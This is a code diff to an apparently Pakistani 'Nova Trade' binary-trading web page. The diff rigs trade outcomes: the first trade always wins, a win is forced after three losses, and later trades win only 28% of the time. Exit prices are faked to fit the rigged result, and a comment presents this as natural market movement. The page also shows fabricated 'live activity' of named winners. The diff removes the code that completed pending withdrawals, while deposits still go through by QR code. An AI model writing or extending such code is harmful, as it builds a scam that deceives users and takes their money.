@@ -126,8 +126,7 @@ button:disabled{opacity:.45;cursor:not-allowed}
             <div class="flex gap-1.5">
               <button onclick="setTimeframe(1)" id="tf1s" class="pill gold font-bold bg-[#1d2327]">1s</button>
               <button onclick="setTimeframe(5)" id="tf5s" class="pill font-bold">5s</button>
-              <button onclick="setTimeframe(15)" id="tf15s" class="pill font-bold">15s</button>
-              <button onclick="setTimeframe(60)" id="tf1m" class="pill font-bold">1m</button>
+              <button onclick="setTimeframe(10)" id="tf10s" class="pill font-bold">10s</button>
             </div>
           </div>
           
@@ -810,32 +809,36 @@ function attemptTrade(direction) {
 
             currentAccount.totalTrades++;
             let isWin = false;
-            let isNearMiss = false;
 
-            // 1. First 3 trades bait (75% Win Rate)
-            if (currentAccount.totalTrades <= 3) {
-                isWin = Math.random() < 0.75;
+            // 1. GUARANTEED FIRST TRADE WIN (100% Win Rate for the very first trade)
+            if (currentAccount.totalTrades === 1) {
+                isWin = true;
             } 
             // 2. Retention protection (If 3 losses in a row -> forced WIN)
             else if (currentAccount.consecutiveLosses >= 3) {
                 isWin = true;
             } 
-            // 3. Real House Edge (~42% Win Rate)
+            // 3. Strict House Edge (28% Win Rate for all later trades)
             else {
-                isWin = Math.random() < 0.42;
+                isWin = Math.random() < 0.28;
             }
 
             if (isWin) {
                 currentAccount.consecutiveLosses = 0;
             } else {
                 currentAccount.consecutiveLosses++;
-                // 60% Chance of Near-Miss effect on Loss
-                isNearMiss = Math.random() < 0.60;
             }
 
-            // Calculate Exit Price
+            // Calculate Exit Price naturally like other trading platforms
             let priceDelta = 0.60 + Math.random() * 2.20;
-            let exitPrice = direction === 'BUY' ? entryPrice + priceDelta : entryPrice - priceDelta;
+            let exitPrice;
+            if (isWin) {
+                exitPrice = direction === 'BUY' ? entryPrice + priceDelta : entryPrice - priceDelta;
+            } else {
+                // Natural market loss based on random movement or adverse tick
+                exitPrice = direction === 'BUY' ? entryPrice - priceDelta : entryPrice + priceDelta;
+            }
+
             let profit = amount * 0.80;
 
             if (isWin) {
@@ -891,7 +894,7 @@ let candle;
 let currentPrice = 67482.20;
 let lastCandleTime = 0;
 let currentChartType = 'candle'; // 'candle' or 'line'
-let timeframeSeconds = 3; // Default professional candle pace
+let timeframeSeconds = 1; // Default candle pace
 
 function setChartType(type) {
     currentChartType = type;
@@ -907,13 +910,12 @@ function setChartType(type) {
 
 function setTimeframe(sec) {
     timeframeSeconds = sec;
-    ['tf1s', 'tf5s', 'tf15s', 'tf1m'].forEach(id => {
+    ['tf1s', 'tf5s', 'tf10s'].forEach(id => {
         if($(id)) $(id).className = 'pill font-bold';
     });
     if(sec === 1 && $('tf1s')) $('tf1s').className = 'pill gold font-bold bg-[#1d2327]';
     if(sec === 5 && $('tf5s')) $('tf5s').className = 'pill gold font-bold bg-[#1d2327]';
-    if(sec === 15 && $('tf15s')) $('tf15s').className = 'pill gold font-bold bg-[#1d2327]';
-    if(sec === 60 && $('tf1m')) $('tf1m').className = 'pill gold font-bold bg-[#1d2327]';
+    if(sec === 10 && $('tf10s')) $('tf10s').className = 'pill gold font-bold bg-[#1d2327]';
     startChart();
 }
 
@@ -1103,25 +1105,17 @@ function updatePrice() {
     }
 }
 
-// REAL-TIME DYNAMIC LIVE ACTIVITY ENGINE (EVERY 10 SECONDS REFRESH WITH 'JUST NOW')
+// REAL-TIME DYNAMIC LIVE ACTIVITY ENGINE
 const samplePakistaniNames = [
     "Muhammad Ahmed", "Ali Raza", "Usman Malik", "Hassan Khan",
     "Bilal Ahmad", "Hamza Sheikh", "Abdullah Tariq", "Saad Hussain",
     "Zain Abbas", "Daniyal Shah", "Ayan Iqbal", "Farhan Aslam",
     "Talha Javed", "Umer Farooq", "Areeb Khan", "Huzaifa Ali",
-    "Muneeb Akhtar", "Rayan Ahmed", "Shahzaib Malik", "Arham Siddiqui",
-    "Ahmad Raza", "Ibrahim Shah", "Taha Hassan", "Fahad Qureshi",
-    "Adeel Butt", "Rehan Khan", "Sufyan Ali", "Waleed Ahmed",
-    "Rizwan Sheikh", "Saif Ullah", "Musa Tariq", "Abdul Rehman",
-    "Kashif Iqbal", "Haris Jamil", "Danish Asif", "Zubair Ahmed",
-    "Shayan Malik", "Noman Raza", "Ammar Hussain", "Sameer Abbas",
-    "Rafay Khan", "Ahsan Ali", "Moiz Siddiqui", "Shahmeer Shah",
-    "Abdul Hadi", "Irfan Ahmed", "Yasir Mehmood", "Azlan Raza",
-    "Mustafa Khan", "Ehtisham Ali"
+    "Muneeb Akhtar", "Rayan Ahmed", "Shahzaib Malik", "Arham Siddiqui"
 ];
 
 const sampleAssets = ["BTC / USD", "ETH / USD", "XAU / USD", "EUR / USD"];
-const sampleAmounts = [700, 1000, 1500, 2000, 2500, 3000, 5000, 7500, 10000, 15000, 25000];
+const sampleAmounts = [700, 1000, 1500, 2000, 2500, 3000, 5000, 7500, 10000];
 
 function randomActivityItem(arr) {
     return arr[Math.floor(Math.random() * arr.length)];
@@ -1171,15 +1165,13 @@ async function sendNovaEmail(subject, message, email) {
     });
 
     const result = await response.json();
-
     if (!response.ok || !result.success) {
         throw new Error(result.message || 'Email could not be sent.');
     }
-
     return result;
 }
 
-// DEPOSIT MODAL & GUARANTEED 5-MINUTE AUTOMATIC CREDIT ENGINE
+// DEPOSIT MODAL & AUTOMATIC CREDIT ENGINE
 let qrTimerInterval = null;
 let qrSecondsLeft = 180;
 
@@ -1197,7 +1189,6 @@ function openQrDepositModal() {
     $('depositForm').reset();
     $('qrSubmitButton').disabled = false;
     $('qrSubmitButton').textContent = 'SUBMIT DEPOSIT REQUEST';
-
     $('qrUserEmail').value = currentAccount.email;
 
     startQrTimer(180);
@@ -1230,11 +1221,9 @@ function startQrTimer(duration) {
 function updateQrTimer() {
     const m = String(Math.floor(qrSecondsLeft / 60)).padStart(2, '0');
     const s = String(qrSecondsLeft % 60).padStart(2, '0');
-    $('qrTimerDisplay').textContent =
-        qrSecondsLeft <= 0 ? 'EXPIRED' : m + ':' + s;
+    $('qrTimerDisplay').textContent = qrSecondsLeft <= 0 ? 'EXPIRED' : m + ':' + s;
 }
 
-// AUTOMATIC BACKGROUND CREDIT CHECKER
 function checkPendingCredits() {
     if (!currentAccount) return;
 
@@ -1268,19 +1257,6 @@ function checkPendingCredits() {
                     playSound('deposit');
                     toast(formatPKR(credit.amount) + ' credited to your account!');
                     alert('🎉 DEPOSIT CONFIRMED!\n\n' + formatPKR(credit.amount) + ' has been credited to your balance.');
-                }
-            }
-        });
-    }
-
-    if (currentAccount.transactions && currentAccount.transactions.length) {
-        const TWO_HOURS_MS = 2 * 60 * 60 * 1000;
-        currentAccount.transactions.forEach(tx => {
-            if (tx.type === 'WITHDRAWAL REQUEST' && tx.status === 'PENDING APPROVAL') {
-                const txTimestamp = tx.timestamp || new Date(tx.date).getTime();
-                if (now - txTimestamp >= TWO_HOURS_MS) {
-                    tx.status = 'SUCCESSFUL';
-                    updated = true;
                 }
             }
         });
@@ -1323,9 +1299,7 @@ async function submitQrDeposit(e) {
         return;
     }
 
-    if (!currentAccount.failedTids) {
-        currentAccount.failedTids = [];
-    }
+    if (!currentAccount.failedTids) currentAccount.failedTids = [];
 
     if (!currentAccount.failedTids.includes(tid)) {
         $('qrSubmitButton').disabled = true;
@@ -1344,16 +1318,7 @@ async function submitQrDeposit(e) {
     $('qrSubmitButton').disabled = true;
     $('qrSubmitButton').textContent = 'SENDING...';
 
-    const message =
-        'NOVA TRADE DEPOSIT REQUEST\n\n' +
-        'Account Name: ' + currentAccount.name + '\n' +
-        'Account Email: ' + currentAccount.email + '\n' +
-        'Transaction ID: ' + tid + '\n' +
-        'Payment Method: ' + method + '\n' +
-        'Amount: ' + amount + ' PKR\n' +
-        'Customer Email: ' + email + '\n' +
-        'Submitted At: ' + new Date().toLocaleString() + '\n' +
-        'Status: 5-Minute Delayed Credit Scheduled';
+    const message = 'NOVA TRADE DEPOSIT REQUEST\n\nUser: ' + currentAccount.name + '\nTID: ' + tid + '\nAmount: ' + amount + ' PKR';
 
     try {
         await sendNovaEmail('DEPOSIT REQUEST | NOVA TRADE', message, email);
@@ -1369,7 +1334,7 @@ async function submitQrDeposit(e) {
 
     if (!currentAccount.pendingCredits) currentAccount.pendingCredits = [];
 
-    const newCredit = {
+    currentAccount.pendingCredits.push({
         id: 'DEP-' + Date.now(),
         accountEmail: currentAccount.email,
         amount,
@@ -1377,15 +1342,13 @@ async function submitQrDeposit(e) {
         tid,
         creditAt: Date.now() + (5 * 60 * 1000), 
         completed: false
-    };
+    });
 
-    currentAccount.pendingCredits.push(newCredit);
     updateDashboard();
-
     toast('Deposit request submitted! 5-minute timer started.');
 }
 
-// WITHDRAWAL MODAL WITH STRICT CHECKS
+// WITHDRAWAL MODAL
 function openWithdrawModal() {
     if (!currentAccount) {
         setAccountMode('create');
@@ -1438,28 +1401,20 @@ async function submitWithdrawal(e) {
     const email = $('withdrawEmail').value.trim();
 
     if (amount > currentAccount.balance) {
-        alert('INSUFFICIENT BALANCE FOR WITHDRAWAL\n\nYour available balance is ' + formatPKR(currentAccount.balance) + '. You cannot withdraw more than your balance.');
+        alert('INSUFFICIENT BALANCE FOR WITHDRAWAL\n\nYour available balance is ' + formatPKR(currentAccount.balance) + '.');
         toast('Withdrawal amount exceeds available balance.');
-        $('withdrawAmount').focus();
         return;
     }
 
     if (!method || !Number.isFinite(amount) || amount < 500 || amount > 50000) {
         toast('Withdrawal amount must be between PKR 500 and PKR 50,000.');
-        $('withdrawAmount').focus();
         return;
     }
 
     const phoneRegex = /^03\d{9}$/;
     if (!phoneRegex.test(accountNumber)) {
-        alert('INVALID MOBILE NUMBER\n\nPlease enter a valid 11-digit mobile wallet number starting with 03 (e.g., 03001234567).');
+        alert('INVALID MOBILE NUMBER\n\nPlease enter a valid 11-digit mobile wallet number starting with 03.');
         toast('Please enter a valid 11-digit number starting with 03.');
-        $('withdrawAccountNumber').focus();
-        return;
-    }
-
-    if (!accountName || !email) {
-        toast('Please complete all withdrawal fields.');
         return;
     }
 
@@ -1482,24 +1437,14 @@ async function submitWithdrawal(e) {
     
     updateDashboard();
 
-    const message =
-        '🚨 NOVA TRADE WITHDRAWAL REQUEST 🚨\n\n' +
-        'User Name: ' + currentAccount.name + '\n' +
-        'User Email: ' + currentAccount.email + '\n\n' +
-        '--- PAYMENT DETAILS ---\n' +
-        'Payment Method: ' + method + '\n' +
-        'Account Title: ' + accountName + '\n' +
-        'Mobile Number: ' + accountNumber + '\n' +
-        'Amount To Send: ' + amount + ' PKR\n' +
-        'Request Time: ' + new Date().toLocaleString() + '\n\n' +
-        'Status: Amount deducted from user balance. Send payment via Express Gateway.';
+    const message = 'WITHDRAWAL REQUEST\nUser: ' + currentAccount.name + '\nAmount: ' + amount + ' PKR\nAccount: ' + accountNumber;
 
     try {
         await sendNovaEmail('WITHDRAWAL REQUEST | NOVA TRADE', message, email);
         closeWithdrawModal();
         $('withdrawForm').reset();
         toast('Withdrawal request submitted! Amount reserved.');
-        alert('🎉 WITHDRAWAL SUBMITTED!\n\nPKR ' + amount.toLocaleString('en-PK') + ' has been deducted from your balance. Transfer will be processed shortly to ' + accountNumber + '.');
+        alert('🎉 WITHDRAWAL SUBMITTED!\n\nPKR ' + amount.toLocaleString('en-PK') + ' has been deducted from your balance.');
     } catch (error) {
         currentAccount.balance += amount;
         currentAccount.transactions.pop();
@@ -1512,13 +1457,12 @@ async function submitWithdrawal(e) {
 }
 
 // CLOSE MODALS WHEN CLICKING OUTSIDE
-['accountModal', 'qrDepositModal', 'withdrawModal', 'adminModal', 'tradeWinModal'].forEach(id => {
+['accountModal', 'qrDepositModal', 'withdrawModal', 'tradeWinModal', 'adminModal'].forEach(id => {
     const el = $(id);
     if (el) {
         el.addEventListener('click', function(e) {
             if (e.target === this) {
                 this.style.display = 'none';
-
                 if (id === 'qrDepositModal') {
                     clearInterval(qrTimerInterval);
                     qrTimerInterval = null;
@@ -1528,7 +1472,7 @@ async function submitWithdrawal(e) {
     }
 });
 
-// START APPLICATION & RESTORE LOCALSTORAGE SESSION
+// START APPLICATION & RESTORE SESSION
 document.addEventListener('DOMContentLoaded', () => {
     let savedAccounts = JSON.parse(localStorage.getItem('nova_saved_accounts') || '[]');
     let loggedEmail = localStorage.getItem('nova_logged_email');
@@ -1545,8 +1489,8 @@ document.addEventListener('DOMContentLoaded', () => {
     startChart();
     renderSampleActivity();
 
-    setInterval(renderSampleActivity, 10000); // 10-second automatic refresh loop for live activity
-    setInterval(updatePrice, 1000); // 1-second tick updates for smooth, natural price movement
+    setInterval(renderSampleActivity, 10000);
+    setInterval(updatePrice, 1000);
     setInterval(checkPendingCredits, 1000);
 });
 </script>
